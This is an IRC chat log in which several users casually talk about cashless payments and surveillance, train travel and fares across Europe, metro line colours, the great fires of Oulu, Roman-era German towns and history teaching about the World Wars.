Jun 21 12:11:15 <FireFly>	hm
Jun 21 12:11:17 <FireFly>	maybe it's just me
Jun 21 12:11:32 *	shikhin doesn't have that either.
Jun 21 12:11:39 <shikhin>	Unless it's an exaggerated Indian accent, that's annoying.
Jun 21 12:11:46 <nortti>	also, reminds me a bit of the situation in china. from what I hear from wenli, mobile payment (mainly alipay I think?) is now a thing™ that most people use due to convenience. however, that also means all their purchases are logged by one of the big companies (which, incidentaly, have gotten the right to run the points systems)
Jun 21 12:12:41 <FireFly>	"An annual survey by Insight Intelligence released last month found that only 25 percent of Swedes paid in cash at least once a week in 2017, down from 63 percent just four years ago. A full 36 percent never use cash, or just pay with it once or twice a year."
Jun 21 12:12:44 <vehk>	But thankfully my own accent is slowly going away
Jun 21 12:12:52 <FireFly>	I'm surprised the 25% number is as high as it is
Jun 21 12:12:58 <FireFly>	for "pays in cash at least once a week"
Jun 21 12:12:59 <shikhin>	nortti: Heh… there's that Indian company here whose name I've forgotten.
Jun 21 12:13:14 <vehk>	FireFly: That is very surprising to me
Jun 21 12:13:34 <shikhin>	After demonetization, they ran adverts with the Prime Minister endorsing them, more or less. Last month one of there senior developers was caught saying on /tape/ that they help the BJP by supplying them with data if need be.
Jun 21 12:13:40 <vehk>	At least once a week... I'd say this is about 80-90% here, if not higher
Jun 21 12:13:49 *	S_Gautam has quit (Ping timeout: 260 seconds)
Jun 21 12:13:50 <FireFly>	I only really use cash abroad, heh, since things like döner kebab stores in german train stations only accept cash apparently
Jun 21 12:13:55 <FireFly>	AS I LEARNED last winter
Jun 21 12:13:57 <vehk>	haha
Jun 21 12:14:01 <nortti>	shikhin: BJP specifically, or the state?
Jun 21 12:14:09 <shikhin>	BJP specifically.
Jun 21 12:14:17 <CompanionCube>	vehk: re the creepy ads
Jun 21 12:14:18 <nortti>	welp
Jun 21 12:14:25 <CompanionCube>	what'd you expect from our authoritarian government
Jun 21 12:14:28 <shikhin>	(Although people suspect he was trying to boast and they really only give data to the state?)
Jun 21 12:14:33 <CompanionCube>	that loves surveilance very very much.
Jun 21 12:14:35 <vehk>	CompanionCube: I'm sorry, I didn't think it was *that* bad
Jun 21 12:14:39 <shikhin>	fwiw, never used cash in the US, except once or twice at the laundry machines…
Jun 21 12:14:50 <CompanionCube>	vehk: btw
Jun 21 12:14:54 <CompanionCube>	what did they look like?
Jun 21 12:14:58 <CompanionCube>	never seen one myself :p
Jun 21 12:15:01 <vehk>	hah
Jun 21 12:15:08 <vehk>	Guess you're not travelling much?
Jun 21 12:15:08 <nortti>	I also rarely use cash in turku, mainly for all the alternative / anarchist stuff
Jun 21 12:15:21 <shikhin>	Also other crappy things like the company not allowing people to delete your accounts or anything.
Jun 21 12:15:21 <vehk>	You don't see them in the city, just mainly in train stations
Jun 21 12:15:27 <nortti>	in oulu moreso, as I'm doing shopping for the family
Jun 21 12:15:32 <CompanionCube>	vehk: not on the train
Jun 21 12:15:45 <vehk>	One had a hooded figure in a dark tunnel (implied train station), saying that you should watch for suspicious stuff
Jun 21 12:16:03 <shikhin>	W-was the hooded figure saying that, or the advert?
Jun 21 12:16:09 <vehk>	And then you have your usual "See it, say it, sorted" or "See it, say it, and we'll sort it" posters
Jun 21 12:16:16 <vehk>	shikhin: The advert
Jun 21 12:16:27 <FireFly>	Aww
Jun 21 12:16:46 <nortti>	shikhin: they're hiring hooded guys to hang out in tunnels and dispense such advice
Jun 21 12:16:53 <vehk>	haha
Jun 21 12:17:01 <shikhin>	nortti: :D
Jun 21 12:17:04 <FireFly>	(hooded figure) "watch out for suspicious activities..." (in smaller print) "how else would you source your drugs"
Jun 21 12:17:10 <FireFly>	or well
Jun 21 12:17:12 *	CompanionCube is also used to having to press the stop button in time for busses
Jun 21 12:17:19 <vehk>	Problem is that I'm paying attention to PA in train stations because here there's useful information from those
Jun 21 12:17:24 <FireFly>	s/watch out/keep your eyes open/
Jun 21 12:17:25 <bslsk05>	​<FireFly*> (hooded figure) "keep your eyes open for suspicious activities..." (in smaller print) "how else would you source your drugs"
Jun 21 12:17:39 <shikhin>	vehk: "See it, say it" sounds fairly crucial.
Jun 21 12:18:09 <vehk>	The amount of times you'll hear it will make it very propagandistic
Jun 21 12:18:14 <vehk>	And obviously it plays with fear
Jun 21 12:18:26 <CompanionCube>	was it london or someplace?
Jun 21 12:18:31 <nortti>	< FireFly> (hooded figure) "watch out for suspicious activities..." (in smaller print) "how else would you source your drugs" ← honestly all the times I've had a possibility of getting drugs, it's been some kind of school / university or university-adjacent thing
Jun 21 12:18:47 <vehk>	CompanionCube: London, Bristol, Manchester, Sheffield, Lincoln
Jun 21 12:18:50 <FireFly>	I haven't heard anything like that here, the only thing I hear pretty frequently (and tend to automatically filter out) is "watch out for pickpockets" kinda stuff
Jun 21 12:18:52 <shikhin>	vehk: Here /in the city/ there's Delhi police speakers blasting that out in Hindi.
Jun 21 12:18:54 <vehk>	(Everywhere I've been)
Jun 21 12:18:58 <vehk>	shikhin: wow
Jun 21 12:19:00 <CompanionCube>	ah
Jun 21 12:19:03 <shikhin>	In random markets and whatnot. It's very… weird.
Jun 21 12:19:19 <CompanionCube>	didn't notice it the few times i went on a train to birmingham but that was a good while ago
Jun 21 12:19:21 <FireFly>	nortti: heh
Jun 21 12:19:23 <shikhin>	Oh hey people tried to pickpocket my family more than once on the Europe trip.
Jun 21 12:19:29 <vehk>	Mh, I'll be in Birmingham next month, we'll see
Jun 21 12:19:41 <FireFly>	shikhin: huh really
Jun 21 12:19:43 <CompanionCube>	vehk: it's a nice place
Jun 21 12:19:56 <CompanionCube>	at one point there was a shopping place directly above the train station
Jun 21 12:20:10 <CompanionCube>	it's not there anymore though because they're doing work
Jun 21 12:20:16 <vehk>	ah
Jun 21 12:20:24 <shikhin>	FireFly: Once it was without me, someone kept trying to ask my family for directions after they'd said they have no clue. Some train official eventually showed up, the person walked away, train official said likely pickpocket.
Jun 21 12:20:29 <vehk>	Mh, I'll actually just be passing through
Jun 21 12:21:01 <vehk>	But I have heard there's a maglev from the airport terminal to the airport train station
Jun 21 12:21:17 <FireFly>	heh, I love the "let's ask the foreigners for directions"
Jun 21 12:21:35 <shikhin>	FireFly: The other time it was with me… dad asked someone if we were on the right track, someone else said yes… then they tried getting us onto the wrong train, which they claimed to be getting on. We said no, they didn't get on it either. Got onto the next train with us, kept trying to come close near my bag / mother's purse… failed, then they got off the next station.
Jun 21 12:21:41 <shikhin>	It was pretty obvious.
Jun 21 12:21:52 <vehk>	Where was this?
Jun 21 12:22:02 <shikhin>	Former no clue (germany?), latter Switzerland.
Jun 21 12:22:10 <FireFly>	when nortti was over and we'd just gotten ice creams on the main touristy souvenir street in the old town in stockholm, someone asked us for directions (uh, to the closest liquor monopoly branch, which sadly I have no idea where it is)
Jun 21 12:23:12 <FireFly>	shikhin: the latter sounds creepy
Jun 21 12:24:05 <nortti>	did they ask you "are you local" or am I misremembering?
Jun 21 12:24:16 <FireFly>	I think so
Jun 21 12:24:49 <FireFly>	I just find it amusing because I felt pretty touristy for actually being from stockholm (ish)
Jun 21 12:24:50 <shikhin>	Hehe, I like it when people here ask me for directions and I have no clue despite living here for at least six years.
Jun 21 12:24:59 <vehk>	:D:
Jun 21 12:25:27 <vehk>	People actually ask me for directions an unusually high amount of time
Jun 21 12:25:38 <FireFly>	nortti: later I remembered there was a metallica concert that weekend in stockholm
Jun 21 12:25:43 <FireFly>	which explains them I guess
Jun 21 12:25:46 <nortti>	mh
Jun 21 12:26:00 <vehk>	From what I've experienced none of them actually were trying to pickpocket
Jun 21 12:26:03 <FireFly>	I did like the exchange..
Jun 21 12:26:15 <vehk>	And you do get people asking you for money here as well
Jun 21 12:26:34 <vehk>	At least in cities I just say no and walk on
Jun 21 12:26:46 <FireFly>	something like "do you know where the closest systembolag is?" "er no, afraid not, I don't drink actually" "well neither are we, that is kind of the crux of the problem"
Jun 21 12:26:54 <vehk>	haha
Jun 21 12:26:54 <shikhin>	:D
Jun 21 12:27:08 <nortti>	< shikhin> Hehe, I like it when people here ask me for directions and I have no clue despite living here for at least six years. ← for me the problem in oulu is that I know alsolutely zero of the place names that one would generally use to give directions. go to the, uh, that one collection of stores there and then head to, uh, the place between that one road and the university
Jun 21 12:27:22 <shikhin>	Oh hey directions remind me of the time we asked someone where $touristy-site is in Paris, they said "That's it, this building right in front of us."
Jun 21 12:27:40 <nortti>	:D
Jun 21 12:27:42 <FireFly>	:D
Jun 21 12:28:09 <FireFly>	"that's it, that's the eiffel tower over there!"
Jun 21 12:28:15 <shikhin>	:D:
Jun 21 12:28:17 <FireFly>	(nah, I realise it wasn't that.. probably)
Jun 21 12:28:27 <vehk>	And the times I had to translate... I've actually had DB staff come up to me and ask whether I spoke English
Jun 21 12:28:37 <nortti>	DB?
Jun 21 12:28:41 <FireFly>	deutsche bahn
Jun 21 12:28:41 <vehk>	Deutsche Bahn
Jun 21 12:28:47 <nortti>	:D:
Jun 21 12:29:05 <nortti>	do you radiate englishspeakingness, or what?
Jun 21 12:29:08 <shikhin>	nortti: Last time someone asked me directions, conversation went  "Do you know where the sports complex is?"  "Sector 11, right?"  "No, sector 12."  "No, it's in sector 11."  "Uh.. okay.. where is it?"  "I don't know, sorry."
Jun 21 12:29:12 <vehk>	nortti: I have no clue, probably
Jun 21 12:29:39 <FireFly>	shikhin: :D:
Jun 21 12:29:54 <FireFly>	also "sector <number>" feels very.. dystopian to me somehow?
Jun 21 12:30:03 <vehk>	nortti: tbh, I think it's more a thing of "oh hey, this one looks young enough"
Jun 21 12:30:06 <nortti>	ah
Jun 21 12:30:21 <shikhin>	Ripe for pickings.
Jun 21 12:30:29 <vehk>	FireFly: Ah, don't worry, Sector 14 is just past the demilitarized zone!
Jun 21 12:30:35 <FireFly>	"The Dwarka Sector 12 Metro Station is located on the Blue Line of the Delhi Metro. List of available ATM at Dwarka Sector 11 metro station"  make your mind up
Jun 21 12:30:49 <FireFly>	shikhin: I guess I can't blame you if you confuse the two
Jun 21 12:30:54 <FireFly>	even wikpedia's article is confused about them
Jun 21 12:30:58 <shikhin>	Haha.
Jun 21 12:31:00 <nortti>	< FireFly> also "sector <number>" feels very.. dystopian to me somehow? ←  https://twitter.com/cybersqyd/status/986965445268951040
Jun 21 12:31:00 <bslsk05>	​twitter: <cybersqyd> exclusively referring to regions of city by the transport zone they're in so i can pretend we're in a cool futuristic cyberpunk dystopia instead of the really bland and boring cyberpunk dystopia we're currently in
Jun 21 12:31:28 <FireFly>	haha
Jun 21 12:32:22 <FireFly>	(see I think Shadowrun: Dragonfall pulled that off really well.. it relied on the metro network a lot, but referred to at least the main hub area by its present-day name, possibly slightly altered)
Jun 21 12:32:28 <vehk>	Though it's actually really nice how in the TGV services here (which are a joint SNCF/DB operation) you get every station and announcement in three languages (German, French, English)
Jun 21 12:32:45 <FireFly>	although for some reason I didn't realise until afterward when I spoke with vehk that "kiez" is an actual german word
Jun 21 12:32:50 <FireFly>	or, hm
Jun 21 12:32:55 <shikhin>	We use colors for metro lines, and now we have a sufficient number of lines that I can't distinguish between the colors.
Jun 21 12:32:57 <vehk>	FireFly: Oh yeah
Jun 21 12:32:57 <FireFly>	something like that, I probably misremember it
Jun 21 12:33:00 <shikhin>	e.g. which is magenta and which is pink.
Jun 21 12:33:08 <FireFly>	what was the word? :P
Jun 21 12:33:08 <CompanionCube>	oh by the way
Jun 21 12:33:13 <CompanionCube>	steam summer sale's on
Jun 21 12:33:14 <nortti>	TGV?
Jun 21 12:33:14 <nanovad>	Metro line #FFB000
Jun 21 12:33:16 <vehk>	FireFly: I don't remember, could have been Kiez?
Jun 21 12:33:20 <shikhin>	nanovad: :D:
Jun 21 12:33:25 <vehk>	nortti: France's ICE, basically
Jun 21 12:33:28 <vehk>	High-speed train service
Jun 21 12:33:30 <FireFly>	oh, it probably was yes
Jun 21 12:33:30 <nortti>	ah
Jun 21 12:33:39 <shikhin>	vehk: Hehe, I liked the French announcements, made me happy that I understand very little French.
Jun 21 12:33:44 <FireFly>	It didn't really sound like a native german word to me for some reason
Jun 21 12:33:48 <nortti>	in all of finnish trains you get in the very least finnish, swedish, and english
Jun 21 12:34:11 *	vehk approves
Jun 21 12:34:15 <FireFly>	shikhin: we use colours too, but we only have four metro lines
Jun 21 12:34:24 <shikhin>	Here you get Hindi in stations and trains despite having no presence of Hindi speakers in the area…
Jun 21 12:34:29 <vehk>	I don't get the colours, though, why not just use letters and numbers?
Jun 21 12:34:32 <FireFly>	although it gets a bit more complicated on the bigger maps with metro, train, light rail and tram lines superimposed
Jun 21 12:34:48 <shikhin>	vehk: Little foresight? Started with a small number of lines, blue and red and whatnot. Now it's out of hand.
Jun 21 12:34:59 <vehk>	Ah, mh, yeah
Jun 21 12:35:26 <nortti>	< FireFly> shikhin: we use colours too, but we only have four metro lines ← meanwhile in helsinki, https://en.wikipedia.org/wiki/File:Helsingin_metrolinja_2017.png

Jun 21 12:35:46 <FireFly>	(also sorry it's three, I forgot the one that is supposed to be constructed doesn't exist yet)
Jun 21 12:36:00 <shikhin>	So far there is red, yellow, blue, green, violet, orange, magenta, pink.
Jun 21 12:36:15 <vehk>	Hmm. I mean we have colours here too on maps, but you reference the services with letter and number (which I can see in that picture as well)
Jun 21 12:36:15 <shikhin>	Not a lot, actually, but the whole pink, magenta, and violet business doesn't seem well thought out?
Jun 21 12:36:16 <FireFly>	nortti: well hey, it's easy to refer to it
Jun 21 12:36:34 <FireFly>	"just take the metro" "yeah but which one?" "the. metro."
Jun 21 12:36:44 <nortti>	haha, indeed
Jun 21 12:37:10 <vehk>	https://www.kvv.de/fileadmin/user_upload/kvv/Bilder/liniennetz/KVV-Liniennetzplan_Schiene.jpg for example
Jun 21 12:37:11 <bslsk05>	​www.kvv.de: image/jpeg [3242.141 kilobytes]
Jun 21 12:37:36 <FireFly>	No-one actually uses the numbers for the different lines here
Jun 21 12:37:38 <shikhin>	vehk: …lol, there's actually an "aqua line" apparently (but everyone knows it as the Noida metro, since it runs in Noida).
Jun 21 12:37:42 <vehk>	haha
Jun 21 12:38:08 <FireFly>	for metro you use colours. for the named lines you use their respective names. for other lines you tend to use "(terminus station)-line"
Jun 21 12:38:15 <vehk>	Interesting
Jun 21 12:38:22 <FireFly>	^  is for informal contexts (although the colours for the metro are used even in official contexts)
Jun 21 12:38:41 <vehk>	I wouldn't even know what to call the colour for the S1 on the thing I posted
Jun 21 12:38:43 <FireFly>	for public announcements they do use the numbers these days (but it's fairly recent)
Jun 21 12:38:48 <vehk>	I mean sure, it's green, but there's another green in there
Jun 21 12:38:55 <shikhin>	Right, sometimes people use the terminus station to refer to lines, but those change a lot since the metros are expanding rapidly so the line color is a more stable point of reference.
Jun 21 12:39:03 <FireFly>	vehk: holy cow that is a big network for Karlsrhue
Jun 21 12:39:05 <FireFly>	ruhe*
Jun 21 12:39:12 <FireFly>	also, I like that map
Jun 21 12:39:14 <FireFly>	it's cute
Jun 21 12:39:20 <vehk>	KVV connects surrounding cities and villages, so you have lots of things
Jun 21 12:39:25 <FireFly>	right
Jun 21 12:39:25 <vehk>	Karlsruhe proper is in the yellow area
Jun 21 12:39:37 <FireFly>	sure
Jun 21 12:39:43 <FireFly>	but you could say the same about Stockhlom
Jun 21 12:39:46 <vehk>	Mh, right
Jun 21 12:39:52 <FireFly>	although the map I linked only really shows the inner part
Jun 21 12:39:53 <vehk>	The map used to be less... wavy
Jun 21 12:40:04 <FireFly>	I kinda like that waviness, I find it cute
Jun 21 12:40:18 <FireFly>	and I'm going to guess it maps better to geography than our highly stylised network map does
Jun 21 12:40:26 <vehk>	Should do
Jun 21 12:40:28 <FireFly>	in which things are waaay distorted
Jun 21 12:40:46 <vehk>	Although distance is very distorted on this one
Jun 21 12:41:43 <vehk>	I've heard that German tram maps are too complicated and hard to understand looking at it
Jun 21 12:41:51 <vehk>	Not really sure why
Jun 21 12:41:56 <shikhin>	Are there trams in most cities?
Jun 21 12:41:58 <vehk>	Yeah
Jun 21 12:42:01 <FireFly>	http://ontheworldmap.com/sweden/city/stockholm/stockholm-metro-map.jpg  ah here's a better map of Stockholm's network, that's mostly up-to-date

Jun 21 12:42:03 <shikhin>	Neat.
Jun 21 12:42:09 <shikhin>	Wonder why we did away with our trams.
Jun 21 12:42:14 <vehk>	Yeah, hm, I can see if you compare it to the Stockholm one
Jun 21 12:42:18 <vehk>	It looks way simpler
Jun 21 12:42:34 <vehk>	I guess Germany bombards you with information a bit

Jun 21 12:43:46 <vehk>	Mh, yeah.
Jun 21 12:43:52 <vehk>	I can see people's problems with the German maps
Jun 21 12:44:17 <vehk>	Have to say, the Berlin one is really crowded...

Jun 21 12:46:11 <shikhin>	As far as I can tell, though, the metro itself has pretty much given up on keeping all the maps updated on all the stations/trains.
Jun 21 12:46:17 <vehk>	Aw
Jun 21 12:46:43 <vehk>	FireFly: Is it a thing in Sweden to buy a train ticket to travel to a city, and then having that ticket be eligible for tram rides?
Jun 21 12:46:57 <FireFly>	Nope
Jun 21 12:46:59 <vehk>	Aw
Jun 21 12:47:27 <nanovad>	what's "public transport"
Jun 21 12:47:28 <nanovad>	:P
Jun 21 12:47:38 <shikhin>	Heheh.
Jun 21 12:48:33 <vehk>	FireFly: This possibly adds to the confusion here, since you can ride the tram with a DB ticket, and then you can ride the KVV services using a Verbundsticket that was issued in a bordering area
Jun 21 12:48:40 <vehk>	And maps usually tend to have information about all of this
Jun 21 12:48:47 <FireFly>	ah interesting
Jun 21 12:49:04 <FireFly>	Is that a general thing for all cities/regions?
Jun 21 12:49:08 <vehk>	Yeah, pretty much
Jun 21 12:49:10 <FireFly>	neat
Jun 21 12:49:38 <vehk>	Then you can also buy tickets with which you can travel all day using any number of services
Jun 21 12:49:43 <vehk>	As long as you stay within a Land
Jun 21 12:49:56 <shikhin>	German mainland?
Jun 21 12:49:59 <vehk>	haha
Jun 21 12:50:00 <FireFly>	hm, are train rides within germany cheap?
Jun 21 12:50:16 <vehk>	I'd say so, yes
Jun 21 12:50:23 <shikhin>	https://twitter.com/Acosta/status/1009871069694627842 :D, wonderful.
Jun 21 12:50:25 <FireFly>	For within Belgium they seemed crazy cheap

Jun 21 12:50:28 <vehk>	But also depends on where you're going
Jun 21 12:50:58 <vehk>	The Baden-Württemberg-Ticket (travel all day long in BW) is 24 EUR for one person, I think 28 EUR for 5 people
Jun 21 12:51:06 <vehk>	So it's more geared towards local transit
Jun 21 12:51:10 <shikhin>	Ooh, neat group discount.
Jun 21 12:51:14 <FireFly>	(Belgium sells a 10-journey pass for €72 for an adult, and a journey has to be a "shortest journey" between two locations but could include transfers and stops
Jun 21 12:51:46 <FireFly>	vehk: ah, huh
Jun 21 12:51:53 <FireFly>	interesting that the difference is so small between 1 and 5 people
Jun 21 12:51:56 <vehk>	You can get a ticket for Germany for 15 EUR/person
Jun 21 12:52:00 <shikhin>	FireFly: Do you talk to a human before boarding or who determines if your journey is valid or not?
Jun 21 12:52:20 <FireFly>	you mean wrt the "shortest journey" thing?
Jun 21 12:52:25 <shikhin>	Yea.
Jun 21 12:52:38 <FireFly>	as long as you're not doing anything silly it should be fine
Jun 21 12:52:52 <FireFly>	or you could just use their online search thingy
Jun 21 12:53:03 <FireFly>	and it'll show suggestions for particular endpoints
Jun 21 12:53:23 <vehk>	Of course if you really need to travel lots, you can look into buying a BahnCard 50 (50% discount on everything) or even BahnCard 100 (go wherever, we don't care)

Jun 21 12:54:08 <vehk>	BahnCard 100 is 4270 EUR for second class, 7225 EUR for first class (per year)
Jun 21 12:54:17 <vehk>	So you do really need to travel lots for that to become reasonable
Jun 21 12:54:20 <FireFly>	ah sure, we have something similar here but those are crazy
Jun 21 12:54:27 <shikhin>	I think my parents bought a travel pass for Germany or something.
Jun 21 12:54:46 <FireFly>	there's a senior citizen here who's been buying the highest-rank year-pass card with SJ for the past N years (N getting pretty big by now)
Jun 21 12:54:49 <vehk>	Yeah, those also exist, and are fairly cheap
Jun 21 12:55:04 <FireFly>	(because fun to travel the country when you're old or something)
Jun 21 12:55:06 <vehk>	I actually quite like DB now that I've seen what mess the UK is wrt trains
Jun 21 12:55:13 <FireFly>	heh
Jun 21 12:55:27 <shikhin>	Are senior citizen discounts common in your countries? (Are here for the train.)
Jun 21 12:55:29 <FireFly>	It's funny how easy it is to complain about one's own infrastructure when one doesn't have a frame of reference
Jun 21 12:55:35 <FireFly>	shikhin: yeah
Jun 21 12:55:37 <vehk>	Seriously, a ride from Manchester to Lincoln is 80 pounds (the price for the same distance here would be around 20 EUR)
Jun 21 12:55:45 <FireFly>	fairly common here for senior ctiizens to get the same discount as youth
Jun 21 12:56:12 <FireFly>	for things like transport or entrance fees to museums etc
Jun 21 12:56:23 <vehk>	Yeah, same here

Jun 21 12:58:40 <vehk>	And you need 3 hours for 120km
Jun 21 12:58:42 <vehk>	;_;
Jun 21 12:58:50 *	shikhin has no idea how much trains cost here, but his guess would be that they'd be much cheaper because subsidized.
Jun 21 12:59:20 <FireFly>	actually, searching for Stockholm->Malmö for an arbitrary day in the future (june 30), I see prices: 595, 645, 745, 754, 835, 994  for second class

Jun 21 13:00:08 <FireFly>	or more like €55-€90
Jun 21 13:00:44 <FireFly>	the expensive ones are the direct ones with no transfers, that are quicker
Jun 21 13:00:57 *	shikhin has no idea how to even check prices for trains in India.

Jun 21 13:24:11 <nortti>	(tho the walls, which mostly survived the latest great fire of oulu, were from 1777)
Jun 21 13:24:43 <vehk>	I guess not really orthodox, but definitely a bit of Byzantine
Jun 21 13:24:58 <nortti>	…never mind, survived the third most recent great fire of oulu

Jun 21 13:25:50 <nanovad>	o.o
Jun 21 13:25:53 <nortti>	oulu, it burns
Jun 21 13:25:59 <vehk>	Like, it's way less ornamental than byzantine (I guess that's the neoclassicism mostly), but the dome especially
Jun 21 13:26:02 <shikhin>	"The fire resulted in the first permanent fire brigade being established in Oulu" …that's the last great fire.
Jun 21 13:26:09 <shikhin>	Surely someone could've thought of that before.

Jun 21 13:30:02 <nortti>	and in 1773 there were three
Jun 21 13:30:34 <nortti>	so, I guess the answer to "How many great fires do you have?" is 11
Jun 21 13:30:35 <vehk>	South-west Germany is actually really neat if you are interested in Roman history and architecture, quite a few remaining pieces & great Roman influence here

Jun 21 13:32:09 <vehk>	Mh, I'd be interested in statistics regarding fires for cities here, actually...
Jun 21 13:32:28 <vehk>	Most of everything is really just "how bad was it bombed" and not "how many times did it burn?"

Jun 21 13:35:27 <nortti>	hey, most of these were accidents and not arsons!
Jun 21 13:35:30 <nortti>	also, wood
Jun 21 13:35:40 <vehk>	How many cases of arson?
Jun 21 13:35:46 <nanovad>	arson - in the middle of the family
Jun 21 13:35:47 <nortti>	one case in oulu
Jun 21 13:36:27 <vehk>	lol, reminds me, I read a wiki article about weird accidents (trying to find it) that had one where arsenic accidentally was added to candy
Jun 21 13:36:36 <nanovad>	"accidentally"

Jun 21 13:42:30 <nortti>	well, cities or towns
Jun 21 13:42:31 <vehk>	How old? Like Romans-old?
Jun 21 13:42:47 <nortti>	let's say before 1700s
Jun 21 13:43:19 <nortti>	(in finland historical period starts in the 13th century, pretty sure)
Jun 21 13:43:51 <nortti>	thinking since english towns seem to be more stoney than in here or in sweden
Jun 21 13:44:00 <vehk>	It's more stone

Jun 21 13:44:28 <FireFly>	Skåne is pretty stoney too
Jun 21 13:44:43 <FireFly>	but we had more access to wood than stone up here
Jun 21 13:44:47 <nortti>	vehk: also, you still have old roman towns inhabited?
Jun 21 13:44:59 <vehk>	Oh, definitely
Jun 21 13:45:06 <vehk>	Trier, for example
Jun 21 13:45:08 <nortti>	wow, cool
Jun 21 13:45:08 <vehk>	Or Rottweil here
Jun 21 13:45:30 <vehk>	"Rottweil was founded by the Romans in AD 73 as Arae Flaviae and became a municipium, but there are traces of human settlement going back to 2000 BC."
Jun 21 13:46:18 <vehk>	Unsure about towns and cities in the north, since that was not in the Roman's sphere of influence
Jun 21 13:46:23 <vehk>	Although of course you have very old settlements there too
Jun 21 13:47:01 <nortti>	mh
Jun 21 13:47:02 <vehk>	The village here was dated back to at least 793, although I bet it's older than that still
Jun 21 13:47:11 <vehk>	Usually everything is very old here
Jun 21 13:49:30 <vehk>	Like, it's more the exception that you have a city not older than say 500 years
Jun 21 13:49:44 <vehk>	Karlsruhe, for example, was planned, and is now about 300 years old
Jun 21 13:49:55 <vehk>	There was nothing there before, although the bordering city of Durlach is very old
Jun 21 13:50:54 <nortti>	are the new towns usually built on places with no gathering of people beforehand, or do they tend to grow out of villages?
Jun 21 13:51:09 <vehk>	The latter, I'd say
Jun 21 13:51:47 <vehk>	Although it's very difficult to say - population density is extremely high here
Jun 21 13:51:54 <nortti>	mh
Jun 21 13:54:09 <vehk>	Germany, or the area at least, has always been extremely fragmented

Jun 21 13:54:33 <vehk>	HRE was a clusterfuck
Jun 21 13:55:16 <nortti>	do I misremember, or were the free cities often in kind of an adversarial relationship with the surrounding pricendoms(?)?
Jun 21 13:55:32 <vehk>	You don't misremember
Jun 21 13:56:24 <nortti>	would the free city own some agricultural land outside the city walls?
Jun 21 13:57:02 <vehk>	Mh, can't actually comment too much on this - would have to read up on it
Jun 21 13:57:08 <vehk>	Although I think that was the case, yes
Jun 21 13:57:11 <nortti>	ah
Jun 21 13:57:43 <vehk>	Sadly the only thing I remember from history class (shitty class anyway) is the three-field system
Jun 21 13:57:49 <nortti>	heh
Jun 21 13:58:20 <nortti>	at least unlike some people from here, you don't remember the picture of a medieval potato farmer
Jun 21 13:59:50 <vehk>	Same with the class on India (yes, we had one) - but most of the time we talked about the farming of dates
Jun 21 13:59:55 <vehk>	Not even joking, like... bah
Jun 21 14:00:00 <nortti>	O_o
Jun 21 14:00:31 <vehk>	I really don't know why they focused on agriculture so much
Jun 21 14:00:39 <CompanionCube>	vehk: HRE is the patron saint of border gore indeed
Jun 21 14:01:28 <nortti>	hm, honestly, you know what I'd love to see more of in fantasy? polities with a similar clusterfuck of structure as the HRE. pseudo-nationstates are boring, give me a mix of fractured set of small princely holdings, free cities, farmers' republics with questionable loyalties, etc.
Jun 21 14:01:31 <CompanionCube>	...man that picture's one of the wrose ones i've seen
Jun 21 14:01:43 <vehk>	Now the history class that I had in English (you could take bilingual classes) was really good
Jun 21 14:01:47 <vehk>	So maybe it's the language :D:
Jun 21 14:02:05 <vehk>	nortti: Oh yeah, I'd love to see that as well
Jun 21 14:03:38 *	CompanionCube should have a go at Voltaire's Nightmare
Jun 21 14:03:40 <vehk>	Possibly the saddest thing about my own education was that history classes were really subpar
Jun 21 14:04:06 <vehk>	And you could actually trace the disappearance of "we have you learn dates by heart"
Jun 21 14:04:20 <vehk>	Where most of the early classes were like that, getting better towards the end
Jun 21 14:05:24 <vehk>	But then towards the end you also have WWII, so...
Jun 21 14:05:35 <nortti>	ah…
Jun 21 14:05:42 <nortti>	how much time did you allocate for it?
Jun 21 14:05:57 <vehk>	WWII in history class is basically like the burying they do in media. Cold War, bah, WWII is more important. Korea? WWII!
Jun 21 14:06:00 <vehk>	Oh, like, all the time
Jun 21 14:06:32 <vehk>	Not even WWI, mind you
Jun 21 14:06:51 <vehk>	There's the usual "Why did the Weimar Republic fail" thing, and then it just goes to WWII
Jun 21 14:07:01 <nortti>	mh
Jun 21 14:07:05 <vehk>	And sure, you can do that, but you can't just ignore everything else ;_;
Jun 21 14:07:32 <nortti>	we had ww1 and ww2 plus "then some things happened after that I guess" take one year
Jun 21 14:07:40 <vehk>	(tbh, the Weimar Republic is really interesting, would recommend reading up on that)
Jun 21 14:07:44 <vehk>	Mh
Jun 21 14:08:10 <nortti>	well, we did have a bit on weimar republic too
Jun 21 14:08:26 <vehk>	Not sure whether this is something you should talk about in history class (and I'm just really interesting in warfare anyway), but until recently I didn't even know much about how fucked up the mine warfare was in WWI

Jun 21 14:09:23 <nortti>	it's kinda a shame weime republic seems to be relagated to the "this is how we get from ww1 to ww2" in school history
Jun 21 14:09:27 <vehk>	Ah yeah
Jun 21 14:09:54 <nortti>	heh, I'm honestly kind of tired with how much of history focuses on war
Jun 21 14:10:04 <vehk>	Sure, I can see that
Jun 21 14:10:54 <nortti>	but on the other hand, that tends to be pretty limited and high-level view too. could see non-ww2 everyday stuff being interesting
Jun 21 14:11:21 <vehk>	Yeah, that is true
Jun 21 14:11:34 <vehk>	You rarely find actual soldier's accounts in history lessons
Jun 21 14:11:37 <vehk>	At least here
Jun 21 14:11:39 <nortti>	mh
Jun 21 14:11:39 <vehk>	It's very abstract
Jun 21 14:12:20 <vehk>	Which, I don't know, it shouldn't be. You just can't grasp the horror like that. I can see how this might be problematic for younger people maybe?
Jun 21 14:12:31 <nortti>	here you do get the "finland fuck year koskenkorva perkele raatteentie sisu" from some random-ass soldier's memoirs or such
Jun 21 14:12:31 <bslsk05>	​<nortti> here you do get the "finland fuck year koskenkorva perkele raatteentie sisu" from some random ass-soldier's memoirs or such
Jun 21 14:12:38 <nortti>	right
Jun 21 14:13:14 <vehk>	Although I've had a very harsh experience regarding the horror of war, since my father showed me a book his father got
Jun 21 14:13:22 <nortti>	oh?
Jun 21 14:13:23 <vehk>	https://en.wikipedia.org/wiki/Krieg_dem_Kriege this one - it's mostly images. But wow
Jun 21 14:13:23 <bslsk05>	​en.wikipedia.org: Krieg dem Kriege - Wikipedia
Jun 21 14:13:38 <vehk>	It's very not-safe-for-work
Jun 21 14:13:40 <nortti>	ah, interesting
Jun 21 14:13:57 <vehk>	It kind of shapes your view when you read it when you're young
Jun 21 14:14:21 <nortti>	“A picture entitled "The field of honour" shows the naked corpse of a soldier dead from typhoid, interred in a hole in the ground. Another shows a mass of bodies collected in a ditch intended to be a mass grave, with the title "The Heroes' Tomb"”
Jun 21 14:14:51 <vehk>	The saddest thing is that this was released 1924
Jun 21 14:14:58 <nortti>	yeah…
